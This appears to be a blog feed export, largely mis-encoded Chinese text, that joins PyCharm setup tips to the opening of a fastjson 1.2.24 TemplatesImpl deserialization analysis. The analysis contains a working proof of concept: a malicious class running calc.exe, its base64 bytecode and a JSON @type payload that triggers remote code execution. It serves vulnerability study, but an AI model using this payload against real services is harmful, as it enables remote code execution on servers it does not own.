src="/2024/04/08/Python/pycharm/2024-04-10-22-28-56.png" alt="2024-04-10-22-28-56"></p><p>è‡³æ­¤ï¼Œè§£é‡Šå™¨è®¾ç½®æˆåŠŸï¼ŒæŒ‰ä½ctrlï¼Œé¼ æ ‡ç§»åŠ¨åˆ°ä»»ä½•å‡½æ•°ä»£ç ï¼Œéƒ½æ˜¾ç¤ºå¯è°ƒå¼çš„é«˜äº®ã€‚</p><h1 id="ä»£ç è¡Œæ•°ç»Ÿè®¡"><a href="#ä»£ç è¡Œæ•°ç»Ÿè®¡" class="headerlink" title="ä»£ç è¡Œæ•°ç»Ÿè®¡"></a>ä»£ç è¡Œæ•°ç»Ÿè®¡</h1><p>å®‰è£…æ’ä»¶  statistic</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-29-28.png" alt="2024-04-10-22-29-28"></p><p>å¯ä»¥ç»Ÿè®¡å½“å‰é¡¹ç›®çš„ä¸åŒç±»å‹ä»£ç ã€ç»Ÿè®¡è§„åˆ™</p><h1 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h1><p>ä½¿ç”¨profileæ£€æŸ¥å„å‡½æ•°ã€æ¨¡å—çš„è¿è¡Œæ—¶é—´ã€è°ƒç”¨æ¬¡æ•°ï¼Œè¿™ä¸ªå¯ä»¥ç”¨æ¥æ’æŸ¥ç¨‹åºä¸­å“ªä¸ªåœ°æ–¹å‡ºç°é—®é¢˜ã€çŸ­æ¿ã€‚</p><p>æ¯”å¦‚ä¹‹å‰åœ¨å†™å¤§æ•°ä¸­ç´ æ•°åˆ†è§£çš„ä»£ç æ—¶ï¼Œæˆ‘ä½¿ç”¨profileæ£€æŸ¥ç´ æ•°åˆ†è§£æ¨¡å—çš„è¿è¡Œæ•ˆç‡ï¼Œæ¥æ¯”å¯¹ä¸åŒä»£ç ç®—æ³•ä¸‹ï¼Œè¿™ä¸ªæ¨¡å—æ˜¯å¦å­˜åœ¨ä¼˜åŒ–å¯èƒ½ã€‚</p><p>å³ä¸Šè§’ç¼–è¾‘è°ƒè¯•å™¨å³ä¾§ï¼Œæœ‰ä¸ª<code>profile</code>ï¼Œè¿™ä¸ªå°±æ˜¯ç”¨æ¥åˆ†æå½“å‰ç¨‹åºçš„ã€‚</p><p><img src="/2024/04/08/Python/pycharm/2024-10-11-12-27-41.png" alt></p><h1 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h1><p>ctrl alt shift x éƒ¨ç½²</p><h1 id="å¢åŠ SFTPéƒ¨ç½²"><a href="#å¢åŠ SFTPéƒ¨ç½²" class="headerlink" title="å¢åŠ SFTPéƒ¨ç½²"></a>å¢åŠ SFTPéƒ¨ç½²</h1><p>ç‚¹å‡» IDEA çš„æ–‡ä»¶ -&gt; è®¾ç½® -&gt; é¡¹ç›®ï¼Œå¦‚å›¾</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-30-04.png" alt="2024-04-10-22-30-04"></p><p>ç‚¹å‡»åŠ å·å‡å·å°±å¯ä»¥æ–°å¢éƒ¨ç½²ã€‚å¦‚æœéƒ¨ç½²ä¸­æ²¡æœ‰ç›®æ ‡çš„SSHï¼Œåˆ™éœ€è¦å…ˆæ·»åŠ â€œpythonè§£é‡Šå™¨â€ï¼Œè¿œç¨‹è§£é‡Šå™¨é‡Œå†™æ–°çš„SSHï¼Œè¿™é‡Œçš„éƒ¨ç½²æ‰ä¼šæœ‰æ–°çš„SSHè´¦å¯†è¿æ¥ã€‚</p><h1 id="å‡½æ•°æ–‡æ¡£"><a href="#å‡½æ•°æ–‡æ¡£" class="headerlink" title="å‡½æ•°æ–‡æ¡£"></a>å‡½æ•°æ–‡æ¡£</h1><p>åœ¨Pythonä¸­ï¼Œå‡½æ•°çš„æ–‡æ¡£å­—ç¬¦ä¸²ï¼ˆdocstringï¼‰é€šå¸¸è¢«ç”¨æ¥æè¿°å‡½æ•°çš„åŠŸèƒ½ã€å‚æ•°ã€è¿”å›å€¼ä»¥åŠå¯èƒ½çš„å¼‚å¸¸ç­‰ä¿¡æ¯ã€‚è¿™äº›æ–‡æ¡£å­—ç¬¦ä¸²è¢«åŒ…è£¹åœ¨ä¸€å¯¹ä¸‰ä¸ªåŒå¼•å·ä¹‹é—´ã€‚</p><p>ä¸€ç§å¸¸è§çš„æ ¼å¼æ˜¯reStructuredTextï¼ˆreSTï¼‰æ ¼å¼ï¼Œè¿™æ˜¯Pythonçš„å®˜æ–¹æ–‡æ¡£æ‰€ä½¿ç”¨çš„æ ¼å¼ã€‚åœ¨reSTæ ¼å¼ä¸‹ï¼Œå‡½æ•°çš„å‚æ•°ï¼ˆparamï¼‰å’Œè¿”å›å€¼ï¼ˆreturnï¼‰å¯ä»¥è¿™æ ·æ ‡æ³¨ï¼š</p><pre><code>def function_name(param1, param2):    &quot;&quot;&quot;    è¿™æ˜¯ä¸€ä¸ªå‡½æ•°çš„ç®€å•æè¿°ã€‚    :param param1: è¿™æ˜¯param1çš„æè¿°ã€‚    :type param1: è¿™æ˜¯param1çš„ç±»å‹ã€‚    :param param2: è¿™æ˜¯param2çš„æè¿°ã€‚    :type param2: è¿™æ˜¯param2çš„ç±»å‹ã€‚    :return: è¿™æ˜¯è¿”å›å€¼çš„æè¿°ã€‚    :rtype: è¿™æ˜¯è¿”å›å€¼çš„ç±»å‹ã€‚    &quot;&quot;&quot;    pass</code></pre><p>æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨Googleæˆ–NumPyé£æ ¼çš„docstringã€‚è¿™æ˜¯Googleé£æ ¼çš„ä¾‹å­ï¼š</p><pre><code>def function_name(param1, param2):    &quot;&quot;&quot;    è¿™æ˜¯ä¸€ä¸ªå‡½æ•°çš„ç®€å•æè¿°ã€‚    Args:        param1 (type): è¿™æ˜¯param1çš„æè¿°ã€‚        param2 (type): è¿™æ˜¯param2çš„æè¿°ã€‚    Returns:        type: è¿™æ˜¯è¿”å›å€¼çš„æè¿°ã€‚    &quot;&quot;&quot;    pass</code></pre><p>PyCharmå’Œå…¶ä»–ä¸€äº›IDEæ”¯æŒè¿™äº›æ ¼å¼ï¼Œå¹¶å¯ä»¥æ ¹æ®docstringç”Ÿæˆç›¸åº”çš„å‡½æ•°/æ–¹æ³•ç­¾åå’Œæ–‡æ¡£ã€‚</p><h3 id="å®é™…ç¤ºä¾‹"><a href="#å®é™…ç¤ºä¾‹" class="headerlink" title="å®é™…ç¤ºä¾‹"></a>å®é™…ç¤ºä¾‹</h3><pre><code>def timeCompare(time1, time2):    &quot;&quot;&quot;ç”¨äºæ¯”è¾ƒä¸¤ä¸ªç±»ä¼¼&#39;2023-05-17&#39;çš„æ—¶é—´æˆ³å­—ç¬¦ä¸²çœ‹è°æ›´æ—©ã€‚time1å¦‚æœæ¯”time2æ›´æ—©æˆ–åŒå¤©çš„è¯ï¼Œè¿”å›Trueï¼›å¦åˆ™è¿”å›False    Args:        time1 (str):ä¼ å…¥ç±»ä¼¼&#39;2023-05-17&#39;çš„æ—¶é—´å­—ç¬¦ä¸²        time2 (str):ä¼ å…¥ç±»ä¼¼&#39;2023-05-17&#39;çš„æ—¶é—´å­—ç¬¦ä¸²    Return:        res (bool):        &quot;&quot;&quot;    datetime1 = datetime.strptime(time1, &#39;%Y-%m-%d&#39;)    datetime2 = datetime.strptime(time2, &#39;%Y-%m-%d&#39;)    if datetime1 &lt;= datetime2:        return True    else:        return Falsedef singleCveHrefSpider(avd_url, session):    &quot;&quot;&quot;ä½¿ç”¨avdç¼–å·ï¼ŒåŒ¹é…å•ä¸ªæ¼æ´è¯¦æƒ…é¡µçš„æ•°æ®    Args:        avd_url(str): avdæ¼æ´çš„é“¾æ¥åœ°å€        session(requests.Session): ç”¨äºç½‘ç»œIOçš„session    Returns:        res(dict): è¿”å›æ— é”®é»˜è®¤Noneçš„å­—å…¸        &quot;&quot;&quot;</code></pre><h1 id="æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨"><a href="#æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨" class="headerlink" title="æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨"></a>æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨</h1><p>æ€»ç»“ï¼š<br>1.pyè§£é‡Šå™¨ä¸­çš„ä¸Šä¼ ç›®å½•é€šå¸¸æ˜¯é»˜è®¤ä¼ åˆ°/tmp/pycharmxxxxä¸­ï¼Œè¿™ä¸ªæ— æ‰€è°“ï¼Œæ”¹ä¸ºæ­£ç¡®çš„ä¸Šä¼ è·¯å¾„å³å¯ã€‚<br>2.<code>éƒ¨ç½²</code>æ”¹æˆæ­£ç¡®çš„ä¸Šä¼ è·¯å¾„<br>3.<code>pyè§£é‡Šå™¨</code>ä¸­çš„è·¯å¾„æ˜ å°„å†™å¯¹ï¼Œå°±å¯ä»¥è¿œç¨‹è°ƒè¯•äº†ã€‚</p><p>è®¾ç½® -&gt; é¡¹ç›® -&gt; pythonè§£é‡Šå™¨</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-31-57.png" alt="2024-04-10-22-31-57"></p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-32-10.png" alt="2024-04-10-22-32-10"></p><p>è¿™é‡Œå¯ä»¥æ”¹ä¸ºæ­£ç¡®çš„è·¯å¾„ï¼Œä¸ä¸€å®šéå¾—ä¸‹é¢çš„ /tmp è·¯å¾„</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-32-34.png" alt="2024-04-10-22-32-34"></p><p>æ˜ å°„è·¯å¾„é€‰æ‹©æœ¬åœ°è·¯å¾„å°±å¯ä»¥ã€‚å¦‚æœè§£é‡Šå™¨çš„æ˜ å°„è·¯å¾„ä¸å¯¹ï¼Œé‚£å›åˆ°ä¸Šå›¾æ”¹ä¸€ä¸‹ï¼Œå†åˆ°è¿™é‡Œé€‰æ‹©æ­£ç¡®çš„æœ¬åœ°è·¯å¾„å°±å¯ä»¥è¿›è¡Œè¿œç¨‹è°ƒè¯•äº†ã€‚</p><p>Pyè§£é‡Šå™¨ä¸­çš„è·¯å¾„æ˜ å°„å¡«å†™æ­£ç¡®ï¼Œå°±å¯ä»¥æ­£å¸¸è¿›è¡Œè¿œç¨‹è°ƒè¯•äº†ã€‚</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-33-14.png" alt="2024-04-10-22-33-14"></p><h3 id="å‘ç‚¹ï¼šPycharm-Canâ€™t-get-remote-credentials-for-deployment-server"><a href="#å‘ç‚¹ï¼šPycharm-Canâ€™t-get-remote-credentials-for-deployment-server" class="headerlink" title="å‘ç‚¹ï¼šPycharm:Canâ€™t get remote credentials for deployment server"></a>å‘ç‚¹ï¼šPycharm:Canâ€™t get remote credentials for deployment server</h3><p>ä¸çŸ¥é“ä¸ºå•¥æˆ‘ä¼šé‡åˆ°è¿™ä¸ªæŠ¥é”™ï¼Œå»é¡¹ç›®ï¼Œpythonè§£é‡Šå™¨ï¼ŒæŠŠç°æœ‰çš„SSHè§£é‡Šå™¨åˆ é™¤äº†ï¼Œé‡æ–°æ·»åŠ ï¼Œå°±æ²¡é—®é¢˜äº†</p><h1 id="å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ"><a href="#å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ" class="headerlink" title="å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ"></a>å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ</h1><p>é¦–å…ˆå¯ç”¨djangoæ”¯æŒï¼Œåœ¨ è®¾ç½® â€“&gt;  è¯­è¨€å’Œæ¡†æ¶  ïƒ  Django  å‹¾é€‰â€œå¯ç”¨Djangoæ”¯æŒâ€</p><p>é…ç½®å¦‚ä¸‹</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-33-54.png" alt="2024-04-10-22-33-54"></p><p>ç„¶åè¦è¿è¡Œï¼Œå°±ç‚¹å‡»è°ƒè¯•é…ç½®å™¨</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-34-08.png" alt="2024-04-10-22-34-08"></p><p>ç›´æ¥é…ç½®åï¼Œè¿è¡Œå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson1.2.24 TemplatesImpl EXP analysis</title>
      <link href="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/"/>
      <url>/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/</url>
      
        <content type="html"><![CDATA[<p>First published: <a href="https://mp.weixin.qq.com/s/8recPwGFPwCcB7x0ANOfwA">æ¯”ç“´ç§‘æŠ€ æ”»é˜²æ¼”ç»ƒæœŸé—´é«˜é£é™©ç»„ä»¶æ¼æ´åˆ†æç³»åˆ—ï¼šfastjson1.2.24 TemplatesImpl åˆ©ç”¨é“¾åˆ†æ</a></p><ul><li><a href="#1-å¯¼è¯­">1 å¯¼è¯­</a></li><li><a href="#2-å®éªŒç¯å¢ƒ">2 å®éªŒç¯å¢ƒ</a></li><li><a href="#3-pocå¤ç°è¿‡ç¨‹">3 POCå¤ç°è¿‡ç¨‹</a><ul><li><a href="#31å¼•å…¥ä¾èµ–">3.1å¼•å…¥ä¾èµ–</a></li><li><a href="#32æ„é€ æ¶æ„ç±»">3.2æ„é€ æ¶æ„ç±»</a></li><li><a href="#33å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç ">3.3å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç </a></li><li><a href="#34-base64ç¼–ç evilclassclass">3.4 base64ç¼–ç EvilClass.class</a></li><li><a href="#35-poc">3.5 POC</a></li></ul></li><li><a href="#4-æ­£å‘åˆ†æ">4 æ­£å‘åˆ†æ</a><ul><li><a href="#41-åˆ†ætemplatesimpl">4.1 åˆ†æTemplatesImpl</a><ul><li><a href="#1classloaderç±»åŠ è½½å™¨">1ã€ClassLoader:ç±»åŠ è½½å™¨</a></li><li><a href="#2-é‡å†™classloaderè¯»å–å­—èŠ‚ç åŠ è½½ç±»">2ã€ é‡å†™ClassLoaderï¼Œè¯»å–å­—èŠ‚ç ï¼ŒåŠ è½½ç±»</a></li><li><a href="#3templatesimplé‡å†™defineclassæ–¹æ³•">3ã€TemplatesImplé‡å†™defineClassæ–¹æ³•</a></li><li><a href="#4è°ƒç”¨é“¾å‘ç°">4ã€è°ƒç”¨é“¾å‘ç°</a></li><li><a href="#5æ‰¾newtransformerçš„æ­£ç¡®è°ƒç”¨è·¯å¾„è¿‡æ»¤ç»“æœ">5ã€æ‰¾newTransformer()çš„æ­£ç¡®è°ƒç”¨è·¯å¾„ï¼Œè¿‡æ»¤ç»“æœ</a></li></ul></li><li><a href="#42-fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨typeé”®è§¦å‘">4.2 fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨@typeé”®è§¦å‘</a></li><li><a href="#43-åˆ†æå¦‚ä½•æ„é€ payload">4.3 åˆ†æï¼šå¦‚ä½•æ„é€ payload</a></li><li><a href="#44-æ¼æ´é£é™©">4.4 æ¼æ´é£é™©</a></li></ul></li><li><a href="#5-å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º">5 å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º</a></li></ul><h1 id="1-å¯¼è¯­"><a href="#1-å¯¼è¯­" class="headerlink" title="1 å¯¼è¯­"></a>1 å¯¼è¯­</h1><p>fastjsonæ˜¯HVVè¡ŒåŠ¨ä¸­å‡ ä¹æœ€ä¸ºå¸¸è§çš„é£é™©ç»„ä»¶ï¼Œåœ¨mavenåº“ä¸­æ”¶å½•çš„ç›´æ¥å…³è”CVEç¼–å·æœ‰ä¸¤ä¸ªï¼šCVE-2017-18349å’ŒCVE-2022-25845ï¼›æœªè¢«CVEæ”¶å½•çš„ç‰¹å®šè§¦å‘æƒ…æ™¯çš„payloadä¹Ÿæœ‰å¤šä¸ªã€‚æœ€è¿‘åœ¨ä¼˜åŒ–æˆ‘å¸ç»„ä»¶å¯è¾¾æ€§æ£€æµ‹å¼•æ“æ—¶ï¼Œå¤ç›˜fastjsonå¤šä¸ªç‰ˆæœ¬çš„æŒ–æ˜å’Œç»•è¿‡æ€è·¯ï¼Œå—ç›ŠåŒªæµ…ã€‚</p><p>ä»å¼€å‘è§’åº¦çœ‹ï¼Œfastjsonæ˜¯é˜¿é‡Œå›¢é˜Ÿä»åº•å±‚æ„å»ºçš„è§£å†³JSONåŠŸèƒ½çš„ç»„ä»¶ï¼Œä»£ç å¼€æºã€ä½¿ç”¨ç®€å•ï¼Œå¯¹å¤§å‹jsonæ•°æ®æ”¯æŒé€Ÿåº¦å¿«ï¼Œå¹¶æ”¯æŒé¢å¤–åœºæ™¯ä¸‹çš„åºåˆ—åŒ–èƒ½åŠ›ã€‚å› æ­¤ï¼Œfastjsonç»„ä»¶è¢«å¹¿æ³›å¼•ç”¨ã€‚</p><p>ä»æ¼æ´åˆ†æè§’åº¦çœ‹ï¼Œfastjsonç»„ä»¶æœ¬èº«å¹¶éå•çº¯çš„RCEæ¼æ´ï¼Œé¡»å…·å¤‡ç‰¹å®šæƒ…å¢ƒæ‰å¯è§¦å‘ï¼›fastjsonè°ƒç”¨é“¾é•¿ï¼Œéœ€é€æ­¥è°ƒè¯•å»ç†è§£è°ƒç”¨å…³ç³»ï¼›å¯¹java runtimeçš„ç±»åŠ è½½å™¨ClassLoaderéœ€ç†è§£åŸç†ï¼›å®˜æ–¹ä¿®å¤æ€è·¯å’Œæ¼æ´æŒ–æ˜è€…çš„ç»•è¿‡æ€è·¯æŒç»­äº†æ•´æ•´1.2.2xåˆ°1.2.8xå¤šä¸ªç‰ˆæœ¬ï¼Œæ€è·¯æ¸…æ™°å·§å¦™ï¼Œæ˜¯ç»å…¸çš„ä»£ç å®¡è®¡ç´ æã€‚</p><p>æœ¬æ–‡ä»¥CVE-2017-18349çš„TemplatesImplè°ƒç”¨é“¾åˆ†æï¼Œè¯¥æ¼æ´è§¦å‘æœ‰ä¸‰æ¡é“¾ï¼Œæœ¬æ–‡ä»…åˆ†æ getOutputProperties()è°ƒç”¨é“¾ã€‚æœ¬æ–‡ä¼šæ›´å¤šçš„ä»åŸç†å’Œæ­£å‘æŒ–æ˜çš„è§’åº¦ï¼Œå±•ç¤ºå¯¹æ¼æ´çš„å®¡è®¡æ€è·¯ã€‚</p><h1 id="2-å®éªŒç¯å¢ƒ"><a href="#2-å®éªŒç¯å¢ƒ" class="headerlink" title="2 å®éªŒç¯å¢ƒ"></a>2 å®éªŒç¯å¢ƒ</h1><pre><code>JDKç‰ˆæœ¬ï¼šjdk1.8u144fastjson 1.2.24:git: https://github.com/alibaba/fastjson commit id: fbba126ï¼ˆæ³¨ï¼šæ­¤æ¼æ´éœ€fastjsonç‰ˆæœ¬1.2.22(å«)åˆ°1.2.24(å«)ï¼Œ1.2.21å’Œ1.2.23æ— æ³•è§¦å‘ï¼‰</code></pre><h1 id="3-POCå¤ç°è¿‡ç¨‹"><a href="#3-POCå¤ç°è¿‡ç¨‹" class="headerlink" title="3 POCå¤ç°è¿‡ç¨‹"></a>3 POCå¤ç°è¿‡ç¨‹</h1><h3 id="3-1å¼•å…¥ä¾èµ–"><a href="#3-1å¼•å…¥ä¾èµ–" class="headerlink" title="3.1å¼•å…¥ä¾èµ–"></a>3.1å¼•å…¥ä¾èµ–</h3><p>pom.xmlä¸­å¼•å…¥fastjson 1.2.24çš„ä¾èµ–ã€‚</p><pre><code>&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;&lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="3-2æ„é€ æ¶æ„ç±»"><a href="#3-2æ„é€ æ¶æ„ç±»" class="headerlink" title="3.2æ„é€ æ¶æ„ç±»"></a>3.2æ„é€ æ¶æ„ç±»</h3><p>ä»£ç å¦‚ä¸‹ï¼Œæ„é€ EvilClassï¼Œå¹¶åˆ›å»ºæ„é€ å‡½æ•°ï¼Œå‘½ä»¤æ‰§è¡Œcalc.exeå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºç¨‹åºã€‚</p><pre><code>package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvilClass extends AbstractTranslet &#123;public EvilClass() throws IOException &#123;        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;@Overridepublic void transform(DOM document, SerializationHandler[] handlers) throws TransletException&#123;    &#125;public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;    &#125;&#125;</code></pre><h3 id="3-3å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç "><a href="#3-3å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç " class="headerlink" title="3.3å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç "></a>3.3å°†æ¶æ„ç±»ç¼–è¯‘å­—èŠ‚ç </h3><p>åˆ‡å…¥EvilClass.javaæ‰€åœ¨ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><pre><code>&quot;C:\Program Files\Java\jdk1.8.0_102\bin\javac.exe&quot;   EvilClass.java</code></pre><p>å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-32-18.png" alt="2024-04-14-12-32-18"></p><h3 id="3-4-base64ç¼–ç EvilClass-class"><a href="#3-4-base64ç¼–ç EvilClass-class" class="headerlink" title="3.4 base64ç¼–ç EvilClass.class"></a>3.4 base64ç¼–ç EvilClass.class</h3><p>ä½¿ç”¨å¦‚ä¸‹ç¨‹åºè¾“å‡ºå­—èŠ‚ç çš„ç¼–ç å†…å®¹ï¼š</p><pre><code>package org.example;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.util.Base64;public class printEncodeClassByteCode &#123;public static void main(String args[]) &#123;byte[] buffer = null;        String filepath = &quot;C:\\Users\\ranja\\Desktop\\å·¥ä½œä»»åŠ¡\\javaComponentTestDemo\\src\\main\\java\\org\\example\\EvilClass.class&quot;;try &#123;            FileInputStream fis = new FileInputStream(filepath);            ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] b = new byte[1024];int n;while((n = fis.read(b))!=-1) &#123;                bos.write(b,0,n);            &#125;            fis.close();            bos.close();            buffer = bos.toByteArray();        &#125;catch(Exception e) &#123;            e.printStackTrace();        &#125;        Base64.Encoder encoder = Base64.getEncoder();        String value = encoder.encodeToString(buffer);        System.out.println(value);    &#125;&#125;</code></pre><p>è¾“å‡ºï¼š</p><pre><code>yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==</code></pre><h3 id="3-5-POC"><a href="#3-5-POC" class="headerlink" title="3.5 POC"></a>3.5 POC</h3><pre><code>package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;public class POC1 &#123;public static void main(String[] args) &#123;String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==\&quot;], \&quot;_name\&quot;:\&quot;\&quot;, \&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;JSON.parseObject(payload, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p>è¿è¡Œï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-35-01.png" alt="2024-04-14-12-35-01"></p><h1 id="4-æ­£å‘åˆ†æ"><a href="#4-æ­£å‘åˆ†æ" class="headerlink" title="4 æ­£å‘åˆ†æ"></a>4 æ­£å‘åˆ†æ</h1><h3 id="4-1-åˆ†æTemplatesImpl"><a href="#4-1-åˆ†æTemplatesImpl" class="headerlink" title="4.1 åˆ†æTemplatesImpl"></a>4.1 åˆ†æTemplatesImpl</h3><h5 id="1ã€ClassLoader-ç±»åŠ è½½å™¨"><a href="#1ã€ClassLoader-ç±»åŠ è½½å™¨" class="headerlink" title="1ã€ClassLoader:ç±»åŠ è½½å™¨"></a>1ã€ClassLoader:ç±»åŠ è½½å™¨</h5><p>è§£é‡ŠTemplatesImplæ¼æ´è°ƒç”¨é“¾ï¼Œé¦–å…ˆéœ€è¦ç®€å•è¯´æ˜ClassLoaderçš„è¿è¡Œæœºåˆ¶ã€‚å› ä¸ºé€ æˆæ¼æ´çš„æ ¹æœ¬åŸå› 